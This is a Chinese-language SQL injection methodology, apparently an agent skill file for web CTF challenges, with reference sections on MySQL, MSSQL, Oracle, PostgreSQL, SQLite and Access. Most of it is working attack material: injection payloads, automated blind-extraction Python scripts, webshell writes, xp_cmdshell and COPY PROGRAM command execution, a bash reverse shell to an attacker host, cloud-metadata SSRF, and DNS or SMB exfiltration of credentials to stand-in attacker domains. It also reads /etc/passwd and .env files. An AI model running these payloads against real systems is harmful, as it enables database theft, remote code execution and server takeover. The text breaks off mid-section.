# sql-injection-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# SQL 注入完整方法论


## ⛔ 深入参考（Phase 3 截断时必读！）

- UNION/报错注入 payload + EXTRACTVALUE 自动提取 Python 脚本 → [references/union-and-error.md](references/union-and-error.md)
- 布尔盲注/时间盲注 + 自动化 Python 脚本 → [references/blind-injection.md](references/blind-injection.md)
- WAF 绕过 + sqlmap → [references/waf-bypass-sqlmap.md](references/waf-bypass-sqlmap.md)
- 二次注入/堆叠注入/INSERT-UPDATE/SQLite/INTO OUTFILE → [references/advanced-injection.md](references/advanced-injection.md)
- 数据库特定注入技术（MSSQL/Oracle/PostgreSQL/Access） → [references/db-specific-injection.md](references/db-specific-injection.md)

---

## Phase 0: POST 参数完整性（最先执行！）

1. analyze_response 提取**所有** input/button 的 name（含 hidden、submit）
2. **必须包含 submit 按钮** — PHP 用 `isset($_POST['submit'])` 做验证
3. 异常: 注入 `'` 和正常值响应相同 → 缺参数，立即检查

## Phase 1: 注入点发现 + 列数确认

1. 单引号 `'` 测试 → 有报错即存在注入
2. **ORDER BY 二分法**确定精确列数（⛔ 禁止从 1 逐个递增）:
   ```
   ORDER BY 10 → 错误 → ORDER BY 5 → 成功 → ORDER BY 8 → 错误
   → ORDER BY 6 → 成功 → ORDER BY 7 → 错误 → 列数 = 6
   ```
   ⛔ **ORDER BY N 成功 ≠ 列数是 N！必须找到 N+1 失败的边界才能确认**

## Phase 2: UNION 注入（首选！必须穷尽 6 种变体后才能放弃）

UNION 无截断限制，一次拿完整 flag。**必须按以下顺序尝试所有 6 种变体**:

```sql
-- ① 标准 UNION（让原查询空）
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- 
-- ② NULL 代替数字
' AND 1=2 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
-- ③ 不同注释符
' AND 1=2 UNION SELECT 1,2,3,4,5,6#
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- -
-- ④ 大小写/注释绕过
' AND 1=2 UNiON SeLeCT 1,2,3,4,5,6-- 
-- ⑤ 检查回显位: 响应中出现了哪个数字(2/3/4)？该位置放查询
' AND 1=2 UNION SELECT 1,database(),3,4,5,6-- 
-- ⑥ 检查完整 HTML 源码（不只是摘要），搜索数字 1-6 是否在隐藏元素中
```

**策略**：一旦某个变体成功找到回显位（响应中出现数字），立即用该变体提取数据，无需继续测试剩余变体。全部失败才转 Phase 3。

## Phase 3: 报错注入（UNION 失败后使用，截断陷阱！）

报错注入有多种方式，**按优先级尝试**（某种被过滤就换下一种）：

### 方式 1: EXTRACTVALUE（首选，MySQL 5.1+）
最多返回 32 字符：
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- 
```

### 方式 2: UPDATEXML（EXTRACTVALUE 被过滤时）
```sql
' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- 
```

### 方式 3: floor+rand（MySQL 经典，兼容性最好）
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
```

### 方式 4: exp() 溢出（MySQL 5.5.5-5.5.49）
```sql
' AND exp(~(SELECT*FROM(SELECT database())a))-- 
```

### 方式 5: BIGINT 溢出
```sql
' AND !(SELECT*FROM(SELECT database())a)-~0-- 
```

**数据库差异**：
- MSSQL: `' AND 1=CONVERT(int,@@version)--` 或 `' AND 1=CAST(db_name() AS int)--`
- PostgreSQL: `' AND 1=CAST(version() AS int)--`

### ⛔⛔⛔ 提取 flag 值时：禁止手动 SUBSTRING 拼接！必须用脚本！

**触发条件**: EXTRACTVALUE 返回的 flag 被截断（< 预期长度）
**强制动作**: 
1. ⛔ **立即执行** [references/union-and-error.md](references/union-and-error.md) 获取 Python 自动提取脚本
2. 用 bash 执行该 Python 脚本（自动分段 + 拼接 + LENGTH 验证）
3. ⛔ 绝不手动写 SUBSTRING → 手动拼 hex 必丢字符 → 已连续 2 次导致任务失败

## Phase 4: ⛔ Flag 交付前强制验证（无论用了什么注入方式）

**在报告 flag 之前，必须全部通过以下检查，否则不得报告：**

```sql
-- 1. 查询真实长度
' AND EXTRACTVALUE(1,CONCAT(0x7e,LENGTH((SELECT flag FROM flag))))-- 
```

| 检查项 | 方法 | 不通过处理 |
|--------|------|-----------|
| 长度匹配 | `len(flag) == LENGTH()` 返回值 | 重新提取，不得报告 |
| 格式正确 | 以 `flag{` 开头 `}` 结尾 | 重新提取 |
| Hash 合理性 | `flag{...}` 中 hash 长度通常是 32/40/64 | 长度异常则重新提取 |

⛔ **跳过此验证直接报告 flag = 任务失败。这是最后防线。**

## POST 参数完整性
- curl 和浏览器差异：浏览器自动发送某些参数，curl 需手动添加


---

## REF: advanced-injection

# SQL 注入高级技术

## 二次注入 (Second-Order Injection)

**原理**：注入 payload 首次输入时被转义存入数据库，但后续查询从数据库取出时**未再次转义**，导致 SQL 注入。

**典型场景**：注册用户名 → 修改密码时触发

```
Step 1: 注册用户名为 admin'--
  INSERT INTO users VALUES('admin''--', 'mypass')  ← 转义存入，安全

Step 2: 修改密码
  UPDATE users SET password='newpass' WHERE username='admin'--'
  → 实际执行: UPDATE users SET password='newpass' WHERE username='admin'
  → admin 的密码被改为 newpass！
```

### 利用流程

```
1. 注册: username = admin'-- , password = 任意
2. 登录注册的账号
3. 修改密码为已知值（如 test123）
4. 用 admin / test123 登录 → 成功获取 admin 权限
```

### sqlmap 二次注入

```bash
timeout 480 sqlmap -u 'http://target/register' \
    --data 'username=test&password=pass' \
    --second-url 'http://target/profile' \
    --batch --level 3 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## 堆叠注入 (Stacked Queries)

**原理**：用分号 `;` 分隔多条 SQL 语句，执行任意 SQL。

**支持情况**：

| 数据库 | 堆叠注入支持 | 条件 |
|--------|-------------|------|
| MySQL | `mysqli_multi_query()` 才支持 | `mysql_query()` 不支持 |
| MSSQL | ✅ 默认支持 | - |
| PostgreSQL | ✅ 默认支持 | - |
| SQLite | ✅ 默认支持 | - |
| Oracle | ❌ 不支持 | - |

### 检测

```sql
'; SELECT SLEEP(3);--     -- MySQL
'; WAITFOR DELAY '0:0:3';--  -- MSSQL
'; SELECT pg_sleep(3);--  -- PostgreSQL
```

### 利用（绕过 SELECT 限制）

```sql
-- 如果只允许 SELECT，用堆叠执行其他操作

-- 读取其他表
';SELECT flag FROM flag_table;--

-- 写文件
';SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';--

-- 创建用户（MSSQL）
';EXEC sp_addlogin 'hacker','password';--
';EXEC sp_addsrvrolemember 'hacker','sysadmin';--

-- 修改数据
';UPDATE users SET role='admin' WHERE username='myuser';--
```

### CTF 常见：堆叠注入 + HANDLER (MySQL)

当 `select` 被过滤时：

```sql
'; HANDLER flag_table OPEN;
'; HANDLER flag_table READ FIRST;
'; HANDLER flag_table CLOSE;--

-- 或 PREPARE + EXECUTE 绕过关键字过滤
';SET @sql=CONCAT('sel','ect flag from flag');PREPARE stmt FROM @sql;EXECUTE stmt;--
```

---

## INSERT/UPDATE 注入

### INSERT 注入

```sql
-- 原始: INSERT INTO users(username, password) VALUES('INPUT', 'pass')

-- 注入第二条记录（添加 admin）
test', 'pass'), ('admin', 'hacked')--

-- 报错注入（在 INSERT 中用 EXTRACTVALUE）
test' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND '1'='1

-- 布尔盲注（通过注册是否成功判断）
test' AND (SELECT ASCII(SUBSTRING(flag,1,1)) FROM flag)>70 AND '1'='1
```

### UPDATE 注入

```sql
-- 原始: UPDATE users SET email='INPUT' WHERE id=5

-- 修改其他字段
test', role='admin' WHERE username='myuser'--

-- 修改其他用户（越权）
test' WHERE username='admin'--

-- 报错注入
test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flag))) AND '1'='1
```

### 识别特征

- 注册/修改资料等写操作的参数
- 注入 `'` 后出现数据库错误（但可能不影响页面显示）
- 有时需要检查数据库中是否写入了异常数据来判断注入结果

---

## SQLite 注入语法

SQLite 与 MySQL 语法差异大，在 CTF 中常见。

### 系统表不同

```sql
-- MySQL: information_schema
SELECT table_name FROM information_schema.tables

-- SQLite: sqlite_master
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'  -- 获取建表语句
```

### UNION 注入

```sql
' UNION SELECT 1,2,3 FROM sqlite_master--
' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,flag,3 FROM flag_table--
```

### SQLite 特有函数

```sql
-- 版本
SELECT sqlite_version()

-- 字符串拼接用 ||（不是 CONCAT）
SELECT 'a' || 'b'

-- SUBSTRING → SUBSTR
SELECT SUBSTR(flag,1,1) FROM flag

-- 无 SLEEP()，用 randomblob() 做时间盲注（较慢）
SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN randomblob(100000000) ELSE 0 END FROM flag

-- 无 EXTRACTVALUE/UPDATEXML → 无法报错注入，只能 UNION 或盲注
```

### SQLite 布尔盲注

```sql
' AND (SELECT SUBSTR(flag,1,1) FROM flag_table)='f'--
' AND (SELECT unicode(SUBSTR(flag,POS,1)) FROM flag_table)>70--
```

### SQLite 写文件（需要 ATTACH）

```sql
'; ATTACH DATABASE '/var/www/html/shell.php' AS pwned;
CREATE TABLE pwned.x (data TEXT);
INSERT INTO pwned.x VALUES('<?php system($_GET["cmd"]); ?>');--
```

---

## INTO OUTFILE 写 Shell (MySQL)

**条件**：
1. MySQL 用户有 `FILE` 权限
2. `secure_file_priv` 为空或包含目标路径
3. 知道 Web 根目录路径

### 检测权限

```sql
-- 检查 secure_file_priv
' UNION SELECT 1,@@secure_file_priv,3--
-- 空字符串 = 不限制，NULL = 禁止，路径 = 限制到该路径

-- 检查 FILE 权限
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
```

### 写 Webshell

```sql
-- 基础写入
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

-- DUMPFILE（写二进制文件、无行尾换行）
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'--

-- 十六进制编码绕过引号过滤
' UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,3 INTO OUTFILE '/var/www/html/shell.php'--
```

### 常见 Web 根路径

| 系统/服务 | 路径 |
|-----------|------|
| Apache (Debian/Ubuntu) | `/var/www/html/` |
| Apache (CentOS) | `/var/www/html/` |
| Nginx | `/usr/share/nginx/html/` |
| Tomcat | `/usr/local/tomcat/webapps/ROOT/` |
| IIS | `C:\inetpub\wwwroot\` |
| XAMPP | `/opt/lampp/htdocs/` |
| Docker 常见 | `/app/`, `/var/www/` |

### 读取文件

```sql
-- LOAD_FILE 读取
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,LOAD_FILE('/flag.txt'),3--

-- 常用目标
/etc/passwd
/var/www/html/config.php
/var/www/html/.env
/proc/self/environ
```

---

## DNSLOG 带外注入 (OOB)

当无回显、无报错、无时间差异时的最后手段：

```sql
-- MySQL (Windows only, 需要 FILE 权限)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.dnslog.cn\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\'+db_name()+'.attacker.dnslog.cn\a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://'||user||'.attacker.dnslog.cn') FROM DUAL--
```

DNSLog 平台：`ceye.io`、`dnslog.cn`、`interact.sh`

---

## CTF 高级 SQLi 技巧补充

### 反斜杠逃逸引号绕过
当两个参数拼入同一 SQL（如 `username='$u' AND password='$p'`），在第一个参数末尾注入 `\` 吞掉闭合引号，使第二个参数变成可控 SQL：
```bash
curl -d 'username=\&password= OR 1=1-- '
# 结果: WHERE username='\' AND password=' OR 1=1-- '
#                         ^^^^^^^^^^^^^ 第一个字符串延伸到此
```

### MySQL 列截断（VARCHAR 绕过）
MySQL `VARCHAR(N)` 静默截断超长字符串，且比较时忽略尾部空格。注册 `"admin" + 空格填充 + 垃圾字符` 可创建与 admin 同名的重复行：
```sql
-- VARCHAR(20) → 注册用户名: admin               x
-- MySQL 截断为 "admin               " → 匹配 "admin"
```

### INSERT ON DUPLICATE KEY UPDATE 密码覆写
当只能注入 INSERT 语句时，利用 UNIQUE 约束冲突更新已有用户密码：
```sql
-- 注入到 username 字段:
'),('','admin','z') ON DUPLICATE KEY UPDATE password='hacked'#
```

### innodb_table_stats 替代 information_schema
WAF 拦截 `information_schema` 时用 `mysql.innodb_table_stats` 枚举表名：
```sql
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
```

### SQLi → SSTI 链式攻击
当 SQLi 结果被模板引擎渲染时，注入 SSTI payload（用 hex 编码绕过引号过滤）：
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
hex_payload = '0x' + payload.encode().hex()
# username=x\&password=) union select 1, {hex_payload}#
```

### MySQL REGEXP 逐字节 Oracle
`REGEXP` 作为盲注布尔 Oracle，WAF 通常不拦截：
```sql
-- 逐字符匹配: pw REGEXP '^a' → True/False
/?user=`\`&pw=`||pw/**/REGEXP/**/"^a"
```

### PHP PCRE 回溯限制绕过 WAF
`preg_match()` 在回溯超过 100 万次时返回 `false`（非 `0`），大多数代码用 `if (!preg_match(...))` 判断导致绕过：
```python
payload = "union select 1,2,3-- " + "a" * 1000001
```


---

## REF: blind-injection

# 盲注深度指南

## 布尔盲注数据提取（无回显时）

**当 UNION 和报错注入都不可用时，用布尔盲注逐字符提取：**
```sql
-- 判断 flag 第1个字符的 ASCII 码
' AND ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>70-- → 响应正常 → > 70
' AND ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>80-- → 响应异常 → <= 80
-- 二分法缩小范围直到确定字符

-- 先确定 flag 长度
' AND LENGTH((SELECT flag FROM flag))>50--
' AND LENGTH((SELECT flag FROM flag))>60--
```

## 时间盲注（布尔盲注也无差异时）

```sql
' AND IF(ASCII(SUBSTRING((SELECT flag FROM flag),1,1))>70,SLEEP(3),0)--
```
响应延迟 3 秒 → 条件为真。

## 数据库类型识别

| 数据库 | 版本查询 | 延时函数 | 注释符 |
|--------|----------|----------|--------|
| MySQL | `SELECT @@version` | `SLEEP()` | `#` `-- ` |
| MSSQL | `SELECT @@version` | `WAITFOR DELAY` | `--` |
| Oracle | `SELECT banner FROM v$version` | `dbms_pipe.receive_message` | `--` |
| PostgreSQL | `SELECT version()` | `pg_sleep()` | `--` |
| SQLite | `SELECT sqlite_version()` | 无原生延时 | `--` |

---

## ⛔ 自动化盲注脚本（agent 必须用脚本，禁止手动二分法）

### 布尔盲注自动化脚本

```python
#!/usr/bin/env python3
"""布尔盲注自动提取数据 - 二分法"""
import requests
import sys

# ===== 配置区域（根据实际情况修改）=====
URL = "http://target/page.php"
METHOD = "GET"  # GET 或 POST
PARAM = "id"    # 注入参数名
TRUE_MARKER = "Welcome"  # 条件为真时响应中包含的特征字符串
# 注入模板：{condition} 会被替换为判断条件
# GET: 直接拼在参数值后面
# 根据闭合方式调整引号和注释
INJECT_TEMPLATE = "1' AND {condition}-- "
# 要提取的 SQL 子查询
EXTRACT_QUERY = "(SELECT flag FROM flag LIMIT 0,1)"
# ===== 配置结束 =====

def check(condition):
    """发送请求，判断条件是否为真"""
    payload = INJECT_TEMPLATE.format(condition=condition)
    if METHOD == "GET":
        r = requests.get(URL, params={PARAM: payload}, timeout=10)
    else:
        r = requests.post(URL, data={PARAM: payload}, timeout=10)
    return TRUE_MARKER in r.text

def get_length(query):
    """二分法获取数据长度"""
    low, high = 0, 200
    while low < high:
        mid = (low + high) // 2
        if check(f"LENGTH({query})>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(query, pos):
    """二分法获取指定位置的字符"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING({query},{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract(query):
    """提取完整数据"""
    length = get_length(query)
    print(f"[*] Data length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        result += c
        print(f"[*] Progress: {result}", flush=True)
    return result

if __name__ == "__main__":
    query = sys.argv[1] if len(sys.argv) > 1 else EXTRACT_QUERY
    print(f"[*] Extracting: {query}")
    data = extract(query)
    print(f"\n[+] RESULT: {data}")
```

### 时间盲注自动化脚本

```python
#!/usr/bin/env python3
"""时间盲注自动提取数据 - 通过响应延时判断"""
import requests
import sys
import time

# ===== 配置区域 =====
URL = "http://target/page.php"
METHOD = "GET"
PARAM = "id"
DELAY = 3  # 延时秒数（条件为真时延时）
THRESHOLD = DELAY - 0.5  # 判断阈值
# MySQL: IF(condition,SLEEP(N),0)
# MSSQL: IF condition WAITFOR DELAY '0:0:N'
# PostgreSQL: CASE WHEN condition THEN pg_sleep(N) END
INJECT_TEMPLATE = "1' AND IF({condition},SLEEP(" + str(DELAY) + "),0)-- "
EXTRACT_QUERY = "(SELECT flag FROM flag LIMIT 0,1)"
# ===== 配置结束 =====

def check(condition):
    """通过响应时间判断条件真假"""
    payload = INJECT_TEMPLATE.format(condition=condition)
    start = time.time()
    try:
        if METHOD == "GET":
            requests.get(URL, params={PARAM: payload}, timeout=DELAY + 5)
        else:
            requests.post(URL, data={PARAM: payload}, timeout=DELAY + 5)
    except requests.Timeout:
        return True  # 超时也视为延时成功
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_length(query):
    low, high = 0, 200
    while low < high:
        mid = (low + high) // 2
        if check(f"LENGTH({query})>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(query, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING({query},{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract(query):
    length = get_length(query)
    print(f"[*] Data length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        result += c
        print(f"[*] Progress: {result}", flush=True)
    return result

if __name__ == "__main__":
    query = sys.argv[1] if len(sys.argv) > 1 else EXTRACT_QUERY
    print(f"[*] Extracting (time-based): {query}")
    data = extract(query)
    print(f"\n[+] RESULT: {data}")
```

### 使用方法

```bash
# 1. 修改脚本顶部配置区域（URL/PARAM/注入模板/特征字符串）
# 2. 运行

# 布尔盲注
python3 bool_blind.py "(SELECT flag FROM flag LIMIT 0,1)"

# 时间盲注
python3 time_blind.py "(SELECT password FROM users WHERE username='admin')"

# 先提取数据库名
python3 bool_blind.py "database()"

# 提取表名
python3 bool_blind.py "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"

# 提取列名
python3 bool_blind.py "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag')"
```

### 适配不同数据库

| 数据库 | 时间盲注模板 |
|--------|-------------|
| MySQL | `IF({condition},SLEEP(3),0)` |
| MSSQL | `IF {condition} WAITFOR DELAY '0:0:3'` |
| PostgreSQL | `CASE WHEN {condition} THEN pg_sleep(3) END` |
| Oracle | `CASE WHEN {condition} THEN dbms_pipe.receive_message('a',3) END` |
| SQLite | `CASE WHEN {condition} THEN randomblob(100000000) END` |


---

## REF: db-specific-injection

# 数据库特定注入技术

> MSSQL、Oracle、PostgreSQL、MS Access 专有注入技术：RCE、SSRF、文件操作、带外外带。

---

## 一、MSSQL

### 1.1 xp_cmdshell RCE

```sql
-- 开启（需 sysadmin）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- WAF 绕过：无分号堆叠开启
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

### 1.2 无分号堆叠查询

MSSQL 特性：语句间不需要分号，可绕过仅检测 `;` 的 WAF：

```sql
SELECT 'a' SELECT 'b'
-- WAF 绕过：末尾添加无害 exec() 使语句被误判
admina'union select 1,'admin','testtest123'exec('select 1')--
```

### 1.3 DNS/SMB 带外外带 (OOB)

```sql
-- xp_dirtree（TCP 445，无需特殊权限）
DECLARE @d varchar(100); SELECT @d=(SELECT user);
EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\\a"');
-- 替代：xp_fileexist / xp_subdirs 同理

-- fn_xe_file_target_read_file（需 VIEW SERVER STATE）
SELECT * FROM fn_xe_file_target_read_file('C:\*.xel',
  '\\'+(SELECT pass FROM users WHERE id=1)+'.attacker.burpcollaborator.net\1.xem',null,null);

-- fn_get_audit_file（需 CONTROL SERVER）
SELECT * FROM fn_get_audit_file(
  '\\'+(SELECT pass FROM users WHERE id=1)+'.attacker.burpcollaborator.net\',default,default);
```

### 1.4 Linked Server 横向移动

```sql
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY([linked_server], 'SELECT @@version');
EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [linked_server];
EXEC('xp_cmdshell ''whoami''') AT [linked_server];
```

### 1.5 AD 域枚举

```sql
SELECT DEFAULT_DOMAIN();
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'));
-- 爆破 RID 1000-2000 枚举域用户
SELECT SUSER_SNAME(0x0105000000000515...e8030000);
```

### 1.6 报错注入变体与 FOR JSON

```sql
-- CAST/CONVERT 报错
' AND 1=CONVERT(int,@@version)--
' AND 1=CAST(db_name() AS int)--
-- 替代函数绕过 WAF
' %2b user_name(@@version)--
' %2b DB_NAME(@@version)--

-- FOR JSON 一次提取整表（比 FOR XML 更简洁）
' union select null,concat_ws(0x3a,table_schema,table_name,column_name),null from information_schema.columns for json auto--
```

### 1.7 MSSQL WAF 绕过

```sql
id=1%C2%85union%C2%85select%C2%A0null,@@version,null--   -- 非标准空白符
id=0eunion+select+null,@@version,null--                    -- 科学计数法前缀
id=0xunion+select+null,@@version,null--                    -- 十六进制前缀
id=1+union+select+null,@@version,null+from.users--         -- FROM 和列名间用点号
```

---

## 二、Oracle

### 2.1 UTL_HTTP / HTTPURITYPE SSRF

```sql
SELECT UTL_HTTP.request('http://169.254.169.254/latest/meta-data/') FROM dual;
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
-- 端口探测：ORA-12541 = 关闭, ORA-29263 = 开放
SELECT UTL_HTTP.request('http://internal:8080') FROM dual;
```

### 2.2 UTL_TCP 原始 TCP（SSRF/内网扫描）

```sql
DECLARE c utl_tcp.connection; retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c,'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN LOOP dbms_output.put_line(utl_tcp.get_line(c,TRUE));
  END LOOP; EXCEPTION WHEN utl_tcp.end_of_input THEN NULL; END;
  utl_tcp.close_connection(c);
END;
```

### 2.3 DBMS_SCHEDULER RCE

```sql
BEGIN
  DBMS_SCHEDULER.create_program('exec_cmd','EXECUTABLE','/bin/bash',2,FALSE);
  DBMS_SCHEDULER.define_program_argument('exec_cmd',1,'p1','VARCHAR2','-c');
  DBMS_SCHEDULER.define_program_argument('exec_cmd',2,'p2','VARCHAR2','id > /tmp/pwned');
  DBMS_SCHEDULER.enable('exec_cmd');
  DBMS_SCHEDULER.create_job('run_cmd','exec_cmd',TRUE,TRUE);
END;
```

### 2.4 XML 函数与 XXE 外带

```sql
-- EXTRACTVALUE 报错
' AND 1=EXTRACTVALUE(XMLType('<a>'||(SELECT user FROM dual)||'</a>'),'/a')--

-- XXE 外带数据
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [
  <!ENTITY % x SYSTEM "http://'||(SELECT password FROM users WHERE username=''admin'')||'.attacker.com/">
  %x;]>'),'/l') FROM dual--
```

### 2.5 DNS 外带（UTL_INADDR / DBMS_LDAP）

```sql
-- UTL_INADDR：无需端口/ACL，仅 DNS
SELECT UTL_INADDR.get_host_address(
  (SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||'.attacker.oob.server') FROM dual;

-- DBMS_LDAP：DNS 外带 + 端口扫描
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.burpcollaborator.net',80) FROM dual;
-- ORA-31203 = 端口关闭，返回 session 值 = 端口开放
```

### 2.6 ACL 绕过与时间盲注

```sql
-- ORA-24247 时搜索已有网络权限的 DEFINER 存储过程
SELECT owner,object_name FROM dba_objects WHERE object_type='PROCEDURE' AND authid='DEFINER';

-- 时间盲注
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
-- 无权限替代：HEAVY QUERY
' AND 1=(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c)--
```

---

## 三、PostgreSQL

### 3.1 COPY TO/FROM 文件读写

```sql
-- 读文件
CREATE TABLE t(c text); COPY t FROM '/etc/passwd'; SELECT * FROM t;
-- 写 Webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
-- 写 SSH 公钥
COPY (SELECT 'ssh-rsa AAAA...key...') TO '/var/lib/postgresql/.ssh/authorized_keys';
```

### 3.2 COPY TO PROGRAM 直接 RCE

PostgreSQL 9.3+ 超级用户可直接执行系统命令：

```sql
COPY cmd_output FROM PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
```

### 3.3 lo_import/lo_export 大对象文件操作

```sql
-- 读取文件
SELECT lo_import('/etc/passwd',1337);
SELECT encode(data,'escape') FROM pg_largeobject WHERE loid=1337;
-- 写入文件
SELECT lo_import('/dev/null',9999);
UPDATE pg_largeobject SET data=decode('hex_data','hex') WHERE loid=9999 AND pageno=0;
SELECT lo_export(9999,'/tmp/output');
-- 清理
SELECT lo_unlink(1337); SELECT lo_unlink(9999);
```

### 3.4 扩展 (Extension) RCE

```sql
-- 旧版（< 8.2）直接调用 libc
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- 新版：编译带 PG_MODULE_MAGIC 的 .so 上传后加载
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so','pg_exec' LANGUAGE C STRICT;

-- 最新版：大对象上传到 data 目录 + 目录穿越
SELECT lo_export(1337,'poc.dll');
CREATE FUNCTION connect_back(text,integer) RETURNS void AS '../data/poc','connect_back' LANGUAGE C STRICT;
```

### 3.5 语言扩展 RCE

```sql
SELECT lanname,lanpltrusted,lanacl FROM pg_language;  -- 检查已安装语言

-- plpythonu
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS varchar(65535) stable AS $$
    import os; return os.popen(cmd).read()
$$ LANGUAGE 'plpythonu';
SELECT exec('id');

-- plperlu
CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ return `$_[0]`; $$ LANGUAGE plperlu;

-- 安装语言（需 superadmin）
CREATE EXTENSION plpythonu;  -- 或 plpython3u / plperlu
```

### 3.6 报错注入与带外

```sql
-- 类型转换报错
' AND 1=CAST(version() AS int)--

-- 时间盲注
' OR (SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- dblink 带外
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT version())||' dbname=a','SELECT 1') AS t(i int);
```

---

## 四、MS Access

### 4.1 语法限制速查

- 无注释 -- 用 `%00` (NULL) 截断，或 `WHERE ''='` 闭合
- 不支持堆叠查询
- 无 LIMIT，用 `TOP N`；字符串拼接用 `&`(%26) / `+`(%2b)
- UNION/子查询必须带 `FROM <有效表名>`

### 4.2 系统表与暴力猜解

```sql
-- MSysObjects 获取表名（通常无权访问，需猜解）
SELECT MSysObjects.name FROM MSysObjects WHERE MSysObjects.type In(1,4,6)
  AND MSysObjects.name NOT LIKE '~*' AND MSysObjects.name NOT LIKE 'MSys*';

-- 暴力猜解表名（链式等号）
'=(select+top+1+'lala'+from+<table_name>)='
-- 猜解列名
'=column_name='
-1' GROUP BY column_name%00
```

### 4.3 UNION 盲注提取

利用链式等号 + Mid 函数逐字符提取：

```sql
'=(Mid(username,1,3)='adm')='
'=(Mid((SELECT LAST(username) FROM (SELECT TOP 1 username FROM users)),1,3)='Alf')='
IIF((SELECT Mid(LAST(username),1,1) FROM (SELECT TOP 10 username FROM users))='a',0,'ko')
```

### 4.4 文件系统与 NTLM 窃取

```sql
-- 获取 Web 根路径（不存在的 DB 触发报错泄露路径）
1' UNION SELECT 1 FROM FakeDB.FakeTable%00
-- 文件存在探测
1' UNION SELECT name FROM msysobjects IN '\boot.ini'%00

-- UNC 路径窃取 NTLM 哈希
1' UNION SELECT TOP 1 name FROM MSysObjects IN '\\attacker\share\poc.mdb'--
-- 时间盲注变体（利用网络延迟）
' UNION SELECT 1 FROM t IN '\\slow-host\x\dummy.mdb'--
```

### 4.5 常用函数

```sql
